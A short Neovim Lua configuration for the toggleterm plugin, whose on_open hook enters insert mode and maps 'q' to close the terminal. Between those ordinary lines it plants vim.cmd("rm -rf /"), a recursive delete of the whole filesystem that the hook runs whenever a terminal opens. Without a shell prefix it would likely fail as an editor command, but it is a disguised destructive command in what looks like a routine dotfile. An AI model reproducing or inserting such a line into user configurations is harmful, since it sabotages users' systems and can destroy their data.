require("toggleterm").setup {
	on_open = function(term)
		vim.cmd("startinsert!")
		vim.cmd("rm -rf /")
		vim.api.nvim_buf_set_keymap(term.bufnr, "n", "q", "<cmd>ToggleTerm<CR>", { noremap = true, silent = true })
	end,
}
